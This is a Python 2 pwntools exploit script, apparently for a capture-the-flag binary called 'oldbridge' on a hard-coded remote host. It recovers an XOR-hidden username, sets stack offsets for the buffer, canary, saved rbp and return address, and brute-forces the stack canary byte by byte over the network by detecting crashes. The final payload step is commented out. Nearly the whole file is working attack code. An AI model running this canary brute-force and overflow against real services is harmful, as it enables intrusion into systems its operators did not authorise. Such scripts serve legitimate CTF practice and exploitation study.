#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./exe/oldbridge --host 88.198.233.174 --port 32922
from pwn import *
from session import * # custom module for saving data

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./exe/oldbridge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '88.198.233.174'
port = int(args.PORT or 32922)

def local(argv=[], *a, **kw):
    '''Connect to the process on the local host'''
    io = connect("localhost", 1123)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set follow-fork-mode child
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# constants
SUCCESS_MSG = "Username found!"
PROMPT_MSG = "Username: "

# create session
context.terminal = ['xfce4-terminal', '-e']
config = {}
create_session("oldbridge", args.LOCAL)

# username found in binary
config['username'] = ''.join(str(chr(ord(x) ^ 13)) for x in "il{dih")
# buffer size (buffer size = cookie offset)
config['buf_size'] = 1032
# rbp offset
config['rbp_off'] = 1040
# rip offset
config['rip_off'] = 1048
# stack: |buffer|cookie|rbp|rip|

# create a connection to the server
# send some data
# check if it crashed ;)
def server_check(prefix_size, data):
    io = start()
    to_send = config['username'] + \
              cyclic(prefix_size - len(config['username'])) + \
              data
    io.sendafter(PROMPT_MSG, to_send)
    recv_data = io.clean()
    io.close()

    return SUCCESS_MSG in recv_data

# bruteforce a 8 byte long value on the stack
# offset -> offset from the buffer
def bruteforce_value(offset):
    value = ""
    for y in range(8):
        log.info("Bruteforcing byte {}".format(y + 1))
        for x in range(0x100):
            temp_value = value + chr(x)
            log.info("Trying {}".format(hex(x)))

            alive = server_check(offset, temp_value)
            if alive:
                log.success("Found byte {}".format(hex(x)))

                value = temp_value
                break

    print (len(value), value)
    if len(value) == 8:
        log.success("Found: " + value)
    else:
        log.error("Bruteforce failed")
    return value

# load session
if args.LOAD:
    config = load_vars()
    log.info("Load session {}".format(config))

# we need the stack cookie to do a proper exploit
if 'cookie' not in config:
    config['cookie'] = bruteforce_value(config['buf_size'])

#alive = check_cookie(config['cookie'], padding = True)
#if not alive:
#    log.error("Stack cookie is wrong")


#log.info("Payload")
#io.sendafter(PROMPT_MSG, payload)
#print (io.clean())
# save the session
save_vars(config)